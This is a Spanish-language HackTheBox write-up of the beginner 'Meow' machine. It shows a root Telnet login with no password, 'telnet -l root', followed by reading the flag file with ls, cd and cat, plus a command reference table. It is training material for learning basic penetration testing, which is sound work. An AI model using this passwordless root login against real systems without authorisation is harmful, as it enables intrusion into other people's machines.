# HTB: Meow (Starting Point)

# HackTheBox Write-up: Meow (Starting Point - Tier 0)

**Autor:** Alejandro Torres | Ingeniero de Sistemas de Telecomunicación
**Plataforma:** HackTheBox
**Dificultad:** Very Easy

---

## Resumen Ejecutivo

"Meow" es una máquina de nivel inicial (Tier 0) diseñada para introducir los conceptos básicos de reconocimiento de red y conexión a servicios remotos obsoletos. El compromiso del sistema se logra al identificar un puerto Telnet expuesto y explotar una mala configuración de control de acceso (ausencia de credenciales).

## Fase 1: Reconocimiento

El primer paso en cualquier auditoría es descubrir qué puertos y servicios están expuestos en la máquina objetivo mediante el escaneo de puertos.

## Fase 2: Enumeración y Explotación

Telnet es un protocolo de red heredado que se utilizaba para acceder a interfaces de línea de comandos de forma remota.

Para interactuar con el servicio descubierto, lanzamos el comando especificando el usuario administrador directamente:

```bash
telnet -l root 10.129.1.17
```

![conexion_mediante_telnet.png](conexion_mediante_telnet.png)

## Fase 3: Post-Explotación (Captura de la Flag)

Con acceso de administrador en la máquina, navegamos por el sistema de archivos hasta el directorio correspondiente y leímos el contenido del archivo objetivo para extraer la *flag*.

Comandos ejecutados:

```bash
ls /
cd /root
ls
cat flag.txt
```

![archivo_comprometido_encontrado.png](archivo_comprometido_encontrado.png)

## Anexo: Leyenda de Comandos y Referencia Rápida

| Comando / Herramienta | Sintaxis de Ejemplo | Descripción y Utilidad |
| --- | --- | --- |
| **Telnet** | `telnet -l root <IP>` | Protocolo de red heredado para establecer sesiones de terminal remota en texto plano. El parámetro `-l root` especifica el usuario con el que se desea autenticar directamente. |
| **Listar Archivos** | `ls /` | Muestra el contenido (archivos y directorios) de la ruta especificada. En este caso, para explorar el directorio raíz del sistema. |
| **Cambio de Directorio** | `cd /root` | Permite navegar y cambiar el directorio de trabajo actual dentro del sistema de archivos hacia la ruta indicada (`/root`). |
| **Visualizar Archivos** | `cat flag.txt` | Lee y muestra por pantalla el contenido completo de un archivo de texto plano directamente en la terminal. |
